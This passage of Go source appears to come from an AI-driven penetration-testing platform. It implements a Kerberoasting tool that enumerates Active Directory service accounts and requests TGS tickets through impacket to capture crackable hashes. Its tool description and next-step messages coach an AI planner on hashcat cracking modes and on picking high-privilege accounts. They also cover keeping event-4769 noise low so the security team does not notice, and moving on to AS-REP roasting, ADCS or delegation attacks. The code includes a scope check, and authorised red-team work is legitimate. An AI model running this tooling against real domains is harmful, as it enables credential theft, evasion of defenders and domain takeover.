		return "Kerberos realm 不匹配：domain 要填 AD DNS 域名（如 corp.local），不要填 DC IP 或 NetBIOS 简称"
	case strings.Contains(low, "invalid credentials") || strings.Contains(low, "logon failure") ||
		strings.Contains(low, "kdc_err_preauth_failed") || strings.Contains(low, "status_logon_failure"):
		return "域凭据认证失败：确认 credential_id/username 与口令/hash 属于该域；失败会消耗 badPwdCount，别反复试"
	case strings.Contains(low, "connection refused") || strings.Contains(low, "no route") ||
		strings.Contains(low, "unreachable") || strings.Contains(low, "connection reset") ||
		strings.Contains(low, "winerror 10061") || strings.Contains(low, "winerror 10060") ||
		strings.Contains(low, "actively refused") || strings.Contains(low, "无法连接") ||
		strings.Contains(low, "积极拒绝") || strings.Contains(low, "连接尝试失败"):
		return "无法连接 DC：确认 88/TCP 与 LDAP(389/636) 可达、dc 填对、没有中间设备阻断"
	case strings.Contains(low, "no such file") || strings.Contains(low, "cannot find") ||
		strings.Contains(low, "no module named") || strings.Contains(low, "not found"):
		return "找不到 GetUserSPNs.py/impacket：在操作机执行 python -m pip install impacket，并把 Python Scripts 目录加入 PATH"
	default:
		return "impacket GetUserSPNs 执行失败：" + kerbFirstLine(out, runErr.Error())
	}
}

func kerbFailureNextSteps(msg string) []string {
	switch {
	case strings.Contains(msg, "时钟偏差"):
		return []string{
			"同步操作机与 DC 时间（Windows: w32tm /resync；Linux: chrony/ntpdate）",
			"确认 domain 填的是 AD DNS 域名（如 corp.local），不是 DC IP",
		}
	case strings.Contains(msg, "认证失败"):
		return []string{
			"用 list_credentials 核对 username/domain/secret；优先用 credential_id",
			"确认账户未锁定/禁用，且 domain 是 AD DNS 域名",
		}
	case strings.Contains(msg, "impacket"):
		return []string{
			"在操作机执行 python -m pip install impacket",
			"确认 GetUserSPNs.py 所在 Scripts 目录在 PATH，或与 python 在同一环境",
		}
	case strings.Contains(msg, "无法连接"):
		return []string{
			"先 dry_run=true 看 DC 88/TCP 与 LDAP 是否可达",
			"确认 dc 填的是 DC IP/FQDN，网络/ACL 没有阻断",
		}
	default:
		return []string{
			"先 dry_run=true 做可达性与 impacket 依赖预检",
			"缩小到 target_user 单账户重试，避免全量请求放大噪声",
		}
	}
}

func kerbFirstLine(out, fallback string) string {
	// Prefer impacket's own error lines over the banner/table, which would
	// otherwise be the "first line" of a failed run that still printed candidates.
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Impacket") || strings.HasPrefix(line, "ServicePrincipalName") {
			continue
		}
		low := strings.ToLower(line)
		if strings.HasPrefix(line, "[-]") || strings.Contains(low, "error") ||
			strings.Contains(low, "exception") || strings.Contains(low, "failed") ||
			strings.Contains(low, "cannot") || strings.Contains(low, "no such") {
			return kerbTruncate(line, 300)
		}
	}
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Impacket") || strings.HasPrefix(line, "ServicePrincipalName") {
			continue
		}
		return kerbTruncate(line, 300)
	}
	return kerbTruncate(fallback, 300)
}

// --- dry run ---

func (t *ToolSet) kerberoastDryRun(ctx context.Context, p *kerberoastParams) map[string]any {
	out := map[string]any{"ldap_port": p.LDAPPort}
	probe := func(port int) map[string]any {
		reachable, errText := probeADTCP(ctx, p.DC, port, 5*time.Second)
		m := map[string]any{"port": port, "reachable": reachable}
		if errText != "" {
			m["error"] = errText
		}
		return m
	}
	out["kerberos_tcp_88"] = probe(88)
	out["ldap"] = probe(p.LDAPPort)
	if runner, err := kerberoastLocateRunner(); err != nil {
		out["impacket_ready"] = false
		out["impacket_error"] = err.Error()
	} else {
		out["impacket_ready"] = true
		out["runner"] = filepath.Base(runner.Bin)
	}
	if p.Username != "" {
		out["auth_username"] = p.Username
	}
	if p.TargetUser != "" {
		out["target_user"] = p.TargetUser
	}
	return out
}

func probeADTCP(ctx context.Context, host string, port int, timeout time.Duration) (bool, string) {
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return false, err.Error()
	}
	_ = conn.Close()
	return true, ""
}

// --- 工具装配 ---

func (t *ToolSet) kerberoast() actool.CoreTool {
	return t.writeExpTool("ad_kerberoast",
		"【AD 攻击 · T1558.003 Kerberoasting】用本任务已登记的域凭据枚举带 SPN 的服务账户，并对目标账户请求 TGS，拿回可离线爆破的 $krb5tgs$ 哈希（hashcat 13100 RC4 / 19700 AES）。\n"+
			"默认只做 LDAP/SPN 枚举（低噪声、不产生 4769）；传 target_user 才对单个账户请求 TGS；request_all=true 才对全部候选请求——每个账户一条 4769，盲扫等于给 SOC 送完整攻击画像，非必要不用。\n"+
			"凭据来源优先级：显式 username+password/hash > credential_id（先 list_credentials 拿 id）> 自动选本任务中域匹配的 password/hash_nt 凭据。secret 不会出现在返回里。\n"+
			"前提：DC 88/TCP 与 LDAP(389/636) 可达、操作机与 DC 时钟偏差 ≤5 分钟、已装 impacket(GetUserSPNs.py)。\n"+
			"命中哈希会回写 finding（evidence 含完整哈希与 hashcat 命令）；仅枚举或未命中会回写 fact 供 planner 续接。dry_run=true 只检查 DC 可达性与 impacket 依赖。",
		obj(map[string]any{
			"dc":            str("域控 IP 或 FQDN，必填"),
			"domain":        str("AD DNS 域名，如 CORP.LOCAL（不是 DC IP / NetBIOS 简称），必填"),
			"target_user":   str("可选：只对该 sAMAccountName 请求 TGS（推荐；会按 sAMAccountName 过滤 LDAP，只产生该账户的 4769）"),
			"request_all":   map[string]any{"type": "boolean", "description": "可选：对枚举到的全部 SPN 账户请求 TGS（高噪声，默认 false；与 target_user 同时存在时 target_user 优先）"},
			"credential_id": map[string]any{"type": "integer", "description": "可选：平台凭据 id（list_credentials 可见）；不传则自动选本任务中域匹配的 password/hash_nt 凭据"},
			"username":      str("可选：显式域用户名（需同时给 password 或 hash；支持 DOMAIN\\user / user@realm，自动取 sAMAccountName）"),
			"password":      str("可选：显式口令（会作为 impacket 参数传递，可能出现在本机进程列表；优先用 credential_id）"),
			"hash":          str("可选：显式 NTLM hash，NT(32 hex) 或 LMHASH:NTHASH"),
			"ldap_port":     map[string]any{"type": "integer", "description": "可选：LDAP 端口，默认 389；仅 dry_run 探测用（支持 389/636；GetUserSPNs 先走 389，遇 strongerAuthRequired 自动回退 636）", "default": 389},
			"timeout_sec":   map[string]any{"type": "integer", "description": "可选：impacket 超时秒数，默认 180，范围 10..600", "default": 180},
			"dry_run":       map[string]any{"type": "boolean", "description": "可选：只探测 DC 88/LDAP 可达与 impacket 是否就绪，不发认证请求"},
		}, "dc", "domain"),
		t.kerberoastHandler)
}

func (t *ToolSet) kerberoastHandler(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var p kerberoastParams
	if err := json.Unmarshal(in, &p); err != nil {
		return actool.Errorf("参数解析失败：" + err.Error()), nil
	}
	if err := p.Validate(); err != nil {
		return actool.Errorf(err.Error()), nil
	}
	if err := t.assertInScope(p.DC); err != nil {
		return actool.Errorf(err.Error()), nil
	}

	start := time.Now()
	res := kerberoastResult{
		ModuleID: kerberoastModuleID, MITRE: kerberoastMITRE, Status: "failed",
		Mode: p.mode(), DC: p.DC, Domain: p.Domain, TargetUser: p.TargetUser,
		SPNs: []spnEntry{}, Hashes: []capturedHash{},
	}

	if p.DryRun {
		res.Status = "dry_run"
		res.Outcome = "dry_run：只探测 DC 88/LDAP 可达性与 impacket 依赖，未发起认证"
		res.Tooling = t.kerberoastDryRun(ctx, &p)
		res.ElapsedMs = time.Since(start).Milliseconds()
		res.NextSteps = []string{
			"dry_run 通过后，先不传 target_user 跑一次枚举，拿到候选账户列表",
			"从候选中挑用户账号（排除 [machine]），再传 target_user 请求单个 TGS",
		}
		return jsonResult(res)
	}

	cred, err := t.resolveKerberoastCredential(ctx, &p)
	if err != nil {
		res.Error = err.Error()
		res.NextSteps = []string{
			"先 add_credential 登记该域的凭据（password 或 hash_nt，domain 填 AD DNS 域名）",
			"或显式传 username+password/hash（password/hash 二选一）",
			"已有凭据时先 list_credentials 拿 credential_id，避免手抄 secret",
		}
		res.ElapsedMs = time.Since(start).Milliseconds()
		return jsonResult(res)
	}
	auth := cred.authInfo()
	res.Auth = &auth
	if cred.Domain != "" && !sameADDomain(cred.Domain, p.Domain) {
		res.Warnings = append(res.Warnings,
			fmt.Sprintf("凭据登记域 %s 与目标域 %s 不一致；如果认证失败，先确认 domain 填的是 AD DNS 域名", cred.Domain, p.Domain))
	}

	request := p.mode() != "enumerate"
	out, runErr := t.runKerberoast(ctx, &p, cred, request)
	res.SPNs, res.Hashes = parseKerberoastOutput(out)
	// impacket's example scripts log failures (auth/clock/LDAP) but still exit 0.
	// Without this check a failed roast would be recorded as "no SPN found" and
	// poison the graph with a false negative.
	if runErr == nil && len(res.Hashes) == 0 {
		if msg := kerberoastOutputError(out); msg != "" {
			runErr = fmt.Errorf("impacket 输出错误：%s", msg)
		}
	}
	if runner, rerr := kerberoastLocateRunner(); rerr == nil {
		res.Tooling = map[string]any{"runner": filepath.Base(runner.Bin)}
	}

	switch {
	case len(res.Hashes) > 0:
		res.Status = "success"
		t.recordKerberoastFindings(ctx, &res)
		res.Outcome = fmt.Sprintf("捕获 %d 个可离线爆破的 TGS 哈希", len(res.Hashes))
		res.NextSteps = []string{
			"把 hashes 写入文件，按 hashcat_mode 离线爆破：-m 13100（RC4/etype23）或 -m 19700（AES/etype17,18）",
			"优先爆破 raw 中含高权组（Domain Admins 等）或密码较老的账户",
			"爆破出明文后用 add_credential 登记并标 verified=true；不要在域内在线爆破服务账号",
		}
		if runErr != nil {
			res.Warnings = append(res.Warnings, "部分 TGS 请求失败："+kerbRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second))
		}
	case runErr != nil:
		res.Status = "failed"
		res.Error = kerbRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second)
		res.OutputTail = kerbTruncate(out, kerberoastOutputTail)
		res.NextSteps = kerbFailureNextSteps(res.Error)
	case request:
		res.Status = "partial"
		res.Outcome = fmt.Sprintf("找到 %d 个 SPN 候选，但没有获得 TGS 哈希；可能目标账户无 SPN、TGS 请求被拒或 DC 策略阻止。", len(res.SPNs))
		detail := res.Outcome + "\n" + kerbSPNDetail(res.SPNs, 15) +
			"\n下一步：确认 target_user 确实是带 SPN 的用户账号（先枚举查），并检查 88/TCP、时钟偏差与凭据状态。"
		t.recordKerberoastFact(ctx, &res,
			fmt.Sprintf("Kerberoast %s：%d 个 SPN 候选，未捕获 TGS 哈希", res.DC, len(res.SPNs)), detail)
		res.NextSteps = []string{
			"先不传 target_user 枚举一次，确认该账户带 SPN（排除 machine_account）",
			"检查 DC 88/TCP 可达、操作机与 DC 时钟差 ≤5 分钟、凭据未禁用/锁定",
			"AES-only 账户爆不动时转 AS-REP roasting / 委派 / ADCS，不要把时间耗在同一个账户上",
		}
	default:
		res.Status = "enumerated"
		if len(res.SPNs) == 0 {
			res.Outcome = "LDAP 查询成功，但没有发现带 SPN 的用户账号。"
			detail := res.Outcome + "\n下一步：转 AS-REP roasting（找 DONT_REQ_PREAUTH）或 ADCS/委派面；如果怀疑凭据读不到 LDAP，先用 list_credentials 确认凭据状态。"
			t.recordKerberoastFact(ctx, &res,
				fmt.Sprintf("Kerberoast 枚举 %s：没有发现带 SPN 的用户账号", res.Domain), detail)
			res.NextSteps = []string{
				"该域当前没有可 Kerberoast 的用户账号 SPN；转 AS-REP roasting / ADCS / 委派",
				"确认凭据能读 LDAP（不是禁用/锁定账号）",
			}
		} else {
			res.Outcome = fmt.Sprintf("发现 %d 个带 SPN 的候选账户，尚未请求 TGS（低噪声）。", len(res.SPNs))
			detail := res.Outcome + "\n" + kerbSPNDetail(res.SPNs, 15) +
				"\n下一步：从候选里挑用户账号（排除 [machine]），优先 svc 命名、高权组、密码较老的账户，再传 target_user 请求 TGS。"
			t.recordKerberoastFact(ctx, &res,
				fmt.Sprintf("Kerberoast 枚举 %s：发现 %d 个带 SPN 的服务账户", res.Domain, len(res.SPNs)), detail)
			res.NextSteps = []string{
				"按优先级挑 target_user：用户账号（排除 [machine]）、svc 命名、高权组、pwdLastSet 较老",
				"再调 ad_kerberoast 并传 target_user=<账号>（只请求该账户，只产生 1 条 4769）",
				"确实需要全量时才传 request_all=true（高噪声，会给每个账户产生 4769）",
			}
		}
	}

	res.ElapsedMs = time.Since(start).Milliseconds()
	return jsonResult(res)
}
